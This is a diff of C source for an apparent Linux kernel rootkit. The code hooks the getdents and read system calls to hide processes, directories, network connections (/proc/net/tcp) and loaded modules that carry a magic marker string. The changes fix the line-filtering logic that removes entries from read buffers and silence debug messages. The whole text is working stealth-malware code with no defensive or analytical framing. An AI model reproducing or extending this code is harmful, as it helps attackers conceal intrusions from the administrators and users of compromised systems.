@@ -16,8 +16,8 @@ atomic_t unlFlag = ATOMIC_INIT (0);
 
 const char *badDirName = "===1234DEADBEAF4321===";
 const char *magicString = "===xxxGANGNAM-STYLExxx===";
-const char *netTcp4String = "/etc/===xxxGANGNAM-STYLExxx===/tcp4.txt";
-const char *modulesString = "/etc/===xxxGANGNAM-STYLExxx===/modules.txt";
+const char *netTcp4String = "/etc/===1234DEADBEAF4321===/tcp4.txt";
+const char *modulesString = "/etc/===1234DEADBEAF4321===/modules.txt";
 const char *badPath = "/proc";
 const char *netTcpStr1 = "/proc/net/tcp";
 const char *netTcpStr2 = "/proc/self/net/tcp";
@@ -60,6 +60,7 @@ int readFileData (const char *fileName, void *buf, size_t count) {
 	int ret = 0;
 	mm_segment_t oldFs;
 	loff_t posFile = 0;
+	struct file *filePtr;
 	
 	
 	oldFs = get_fs();
@@ -67,7 +68,7 @@ int readFileData (const char *fileName, void *buf, size_t count) {
 	filePtr = filp_open (fileName, O_RDONLY, 0);
 	if (IS_ERR (filePtr)) {
 #ifdef MY_OWN_DEBUG
-		printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
+		printk ("Can't open: %s - %d\n", fileName, (int)filePtr);
 #endif
 		set_fs (oldFs);
 		return 0;
@@ -75,7 +76,7 @@ int readFileData (const char *fileName, void *buf, size_t count) {
 	
 	if ((ret = vfs_read (filePtr, buf, count, &posFile)) < 0) {
 #ifdef MY_OWN_DEBUG
-		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
+		printk ("Error at reading from: %s, ret: %d\n", fileName, (int)ret);
 #endif
 		ret = 0;
 	}
@@ -115,7 +116,7 @@ int needHideProc (char *chPtr) {
 	filePtr = filp_open (chBuf, O_RDONLY, 0);
 	if (IS_ERR (filePtr)) {
 #ifdef MY_OWN_DEBUG
-		printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
+		//printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
 #endif
 		kfree (chBuf);
 		set_fs (oldFs);
@@ -124,7 +125,7 @@ int needHideProc (char *chPtr) {
 	
 	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
 #ifdef MY_OWN_DEBUG
-		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
+		//printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
 #endif
 		filp_close (filePtr, NULL); // current->files
 		kfree (chBuf);
@@ -137,7 +138,7 @@ int needHideProc (char *chPtr) {
 	if (strstr (chBuf, magicString)) ret = 1;
 	
 #ifdef MY_OWN_DEBUG
-	if (ret) printk ("Hided: %s - %s\n", chPtr, chBuf);
+	//if (ret) printk ("Hided: %s - %s\n", chPtr, chBuf);
 #endif
 	filp_close (filePtr, NULL);
 	kfree (chBuf);
@@ -199,7 +200,7 @@ int isTrustedProcess () {
 	filePtr = filp_open (chBuf, O_RDONLY, 0);
 	if (IS_ERR (filePtr)) {
 #ifdef MY_OWN_DEBUG
-		printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
+		//printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
 #endif
 		kfree (chBuf);
 		set_fs (oldFs);
@@ -208,7 +209,7 @@ int isTrustedProcess () {
 	
 	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
 #ifdef MY_OWN_DEBUG
-		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
+		//printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
 #endif
 		filp_close (filePtr, NULL);
 		kfree (chBuf);
@@ -221,7 +222,7 @@ int isTrustedProcess () {
 	chBuf[retLen] = '\0';
 	if (strstr (chBuf, magicString)) ret = 1;
 #ifdef MY_OWN_DEBUG
-	if (ret) printk ("Trusted process");
+	//if (ret) printk ("Trusted process");
 #endif
 	filp_close (filePtr, NULL);
 	kfree (chBuf);
@@ -239,7 +240,7 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 	
 	
 #ifdef MY_OWN_DEBUG
-	printk ("Intercepted function sys_getdents\n");
+	//printk ("Intercepted function sys_getdents\n");
 #endif
 	
 	atomic64_inc (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
@@ -249,8 +250,8 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 		//
 		if (IS_ERR (fdPtr = fget (fd))) {
 #ifdef MY_OWN_DEBUG
-			printk ("Have found NULL ptr to struct file at FDT "
-					"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
+			//printk ("Have found NULL ptr to struct file at FDT "
+			//		"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
 #endif
 		} else {
 			realPath = d_path (&fdPtr->f_path, buf, bufLen);
@@ -294,27 +295,36 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 
 
 int processReading (const char *fileName, int fd, void *buf, size_t count) {
-	int ret;
+	int ret, ret1;
 	char *chpArr [strArrSize], *chBuf, *chBuf1, *chTmp;
 	struct file *filePtr;
 	
 	
+#ifdef MY_OWN_DEBUG
+	printk ("processReading function\n");
+#endif
+
+	if ((ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count)) <= 0) {
+		return ret;
+	}
+	
 	for (int i = 0; i < strArrSize; ++i) chpArr[i] = NULL;
 	
-	
-	if (!(chBuf = kmalloc (lineSize * strArrSize, GFP_KERNEL))) return 0;
-	if (!(chBuf1 = kmalloc (count + 1, GFP_KERNEL))) {
-		kfree (chBuf);
-		return 0;
+	if (!(chBuf = kmalloc (lineSize * strArrSize, GFP_KERNEL))) {
+		return ret;
 	}
-	if ((ret = readFileData (fileName, chBuf, lineSize * strArrSize - 1)) <= 0) {
+	if (!(chBuf1 = kmalloc (count + 2, GFP_KERNEL))) {
+		kfree (chBuf);
+		return ret;
+	}
+	if ((ret1 = readFileData (fileName, chBuf, lineSize * strArrSize - 1)) <= 0) {
 		kfree (chBuf1);
 		kfree (chBuf);
-		return 0;
+		return ret;
 	}
 	chTmp = chBuf;
-	for (int i = 0, j = 0; i < ret; ++i) {
-		if (chBuf[i] == '\n') {
+	for (int i = 0, j = 0; i < ret1; ++i) {
+		if (chBuf[i] == '\n' || chBuf[i] == ' ') {
 			 chBuf[i] = '\0';
 			 chpArr[j] = chTmp;
 			 ++j;
@@ -323,42 +333,48 @@ int processReading (const char *fileName, int fd, void *buf, size_t count) {
 		}
 	}
 	
-	if ((ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count)) <= 0) {
-		kfree (chBuf1);
-		kfree (chBuf);
-		return ret;
-	}
 	copy_from_user (chBuf1, buf, ret);
-	chBuf1 [ret] = '\0';
-	
-	int i = 0;
-	while (chpArr[i] != NULL) {
-		if ((chTmp = strstr (chBuf1, chpArr[i])) != NULL) {
-			memmove (chTmp,
-					 chTmp + strlen (chpArr[i]) + sizeof ('\n'),
-					 ret - ((size_t)chTmp - (size_t)chBuf1 + 1 + sizeof ('\0'))
-			);
+	chBuf1 [ret] = '\n';
+	chBuf1 [ret + 1] = '\0';
+//printk ("RESULT: %s\n", chBuf1);	
+	int i = 0, j;
+	ret += 1;
+	while (chpArr[i] != NULL && strlen (chpArr[i]) != 0) {
+//printk ("CUR_STR: %s===\n", chpArr[i]);
+		if ((chTmp = strstr (chBuf1, chpArr[i])) != NULL && 0 != strlen (chpArr[i])) {
+			j = 0;
+			while (chTmp[j] != '\n') ++j;
+			j += sizeof ('\n');
+			memmove (chTmp, chTmp + j, ret - j - ((size_t)chTmp - (size_t)chBuf1 + 1) + 1);
+			ret = strlen (chBuf1);
 		}
 		++i;
 	}
+//printk ("INSIDE 111\n");	
 	// we have read a half of a string
-	int i = strlen (chBuf1) - 1;
-	if (ret == count && chBuf[i] != '\n') {
+	ret -= 1;
+	if (ret == count && chBuf1[strlen (chBuf1) - 1 - 1] != '\n') {
+//printk ("INSIDE 222\n");
+		int j, i;
+		loff_t oldPos;
+		
+		i = strlen (chBuf1) - 1;
 		if (IS_ERR (filePtr = fget (fd))) {
 			kfree (chBuf1);
 			kfree (chBuf);
 			return 0;
 		}
 		
-		
-		while (chBuf1[i] != '\n') --i;
-		i = strlen (&chBuf1[i]);
-		int j = vfs_read (filePtr, BUF, COUNT, POS);
-		
+		for (j = i; j >= 0; --j) if (chBuf1[j] == '\n') break;
+		++j;
+		for (; j < i; ++j) chBuf1[j] = '\0';
+		filePtr->f_pos = ret = strlen (chBuf1);
 		fput (filePtr);
 	}
+//printk ("Ret: %d\n", ret);	
+//printk ("\n\n\n=========\n%s\n\n", chBuf1);
+	copy_to_user (buf, chBuf1, ret);
 	
-	// copy backward
 	kfree (chBuf1);
 	kfree (chBuf);
 	
@@ -383,8 +399,8 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 		if (!isTrustedProcess ()) {
 			if (IS_ERR (fdPtr = fget (fd))) {
 #ifdef MY_OWN_DEBUG
-			printk ("Have found NULL ptr to struct file at FDT "
-					"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
+			//printk ("Have found NULL ptr to struct file at FDT "
+			//		"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
 #endif
 				bufTmp [0] = '\0';
 			} else realPath = d_path (&fdPtr->f_path, bufTmp, bufLen);
@@ -395,11 +411,12 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 			}
 			else if (strstr (modulesStr, realPath)) {
 				ret = processReading (modulesString, fd, buf, count);
+			} else {
+				//
+				// Original call
+				//
+				ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
 			}
-			//
-			// Original call
-			//
-			ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
 		}
 		
 		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
